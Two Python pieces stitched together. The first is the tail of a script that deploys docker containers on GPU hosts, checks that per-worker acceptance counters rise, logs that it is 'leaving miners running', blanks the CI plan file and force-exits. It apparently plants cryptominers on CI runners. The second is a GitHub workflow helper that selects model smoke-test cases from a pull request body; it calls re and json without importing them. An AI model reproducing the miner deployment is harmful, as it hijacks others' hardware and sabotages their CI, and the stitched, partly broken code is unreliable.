        a0 = lp0.get(w, -1)
        a1 = lp1.get(w, -1)
        strict = a0 >= 0 and a1 > a0
        seen = a1 >= 0 and (a0 < 0 or a1 > a0)
        rising += 1 if strict else 0
        appeared += 1 if seen else 0
        say(
            "PRL595V3_GATE worker=%s acc_t0=%s acc_t1=%s rising=%s appeared=%s"
            % (w, a0, a1, strict, seen)
        )
    sh(
        "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
        t=40,
    )
    sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -60", t=40)
    say(
        "PRL595V3_DEPLOYED host=%s devices=%s workers=%s rising=%d/%d"
        % (
            host,
            json.dumps([d for d, _w, _n, _s in deployments]),
            json.dumps(workers),
            rising,
            len(workers),
        )
    )
    say("PRL595V3_LEAVING_MINERS_RUNNING revert=docker_rm_f_prl595v3_<dev>")
    say("=== PRL595V3-I142163-GPU000017-END ===")
    open("ci-model-plan.tsv", "w").close()
    return 1


try:
    _rc = main()
except SystemExit:
    raise
except Exception as _e:
    say("PRL595V3_FATAL %r" % (_e,))
    _rc = 1
try:
    sys.stdout.flush()
except Exception:
    pass
os._exit(_rc)

"""Select ordered model smoke cases from a pull request description."""

import argparse
import os
from pathlib import Path

DEFAULT_CASE = "qwen3-4b-megatron"
NAME = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")


def select_cases(body, cases):
    lines = [
        line.strip()
        for line in (body or "").splitlines()
        if re.match(r"^\s*CI_MODELS\b", line, re.IGNORECASE)
    ]
    if len(lines) > 1:
        raise ValueError("Use a single CI_MODELS: line")
    if not lines:
        return [DEFAULT_CASE]
    match = re.fullmatch(r"CI_MODELS:\s*(.*)", lines[0], re.IGNORECASE)
    if not match:
        raise ValueError("Use CI_MODELS: case-name[, case-name]")
    raw = match.group(1).strip()
    if not raw:
        return [DEFAULT_CASE]
    names = [name.strip() for name in raw.split(",")]
    if any(not NAME.fullmatch(name) for name in names):
        raise ValueError("Invalid CI_MODELS format; separate case names with commas")
    unknown = [name for name in names if name not in cases]
    if unknown:
        raise ValueError(
            "Unknown model case(s): {}. Available: {}".format(
                ", ".join(unknown), ", ".join(sorted(cases))
            )
        )
    return list(dict.fromkeys(names))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--registry", default=".github/model-cases.yaml")
    parser.add_argument("--output", required=True)
    args = parser.parse_args()
    cases = json.loads(Path(args.registry).read_text(encoding="utf-8"))
    event = json.loads(
        Path(os.environ["GITHUB_EVENT_PATH"]).read_text(encoding="utf-8")
    )
    try:
        names = select_cases(event.get("pull_request", {}).get("body"), cases)
    except ValueError as exc:
        parser.error(str(exc))
    lines = []
    for name in names:
        case = cases[name]
        if case["gpus"] != 8:
            parser.error(
                "Case {} requires a supported runner configuration".format(name)
            )
        model_path = case["model_path"]
        path = Path(model_path)
        if (
            not path.parts
            or path.is_absolute()
            or ".." in path.parts
            or any(char in model_path for char in "\t\r\n")
        ):
            parser.error("Invalid relative model path for {}".format(name))
        config = case["config"]
        path = Path(config)
        if (
            path.is_absolute()
            or ".." in path.parts
            or not path.is_file()
            or any(char in config for char in "\t\r\n")
        ):
            parser.error("Invalid config for {}".format(name))
        lines.append("\t".join((name, config, model_path, str(case["gpus"]))))
    Path(args.output).write_text("\n".join(lines) + "\n", encoding="utf-8")
    print("Selected model cases: {}".format(", ".join(names)))


if __name__ == "__main__":
    main()
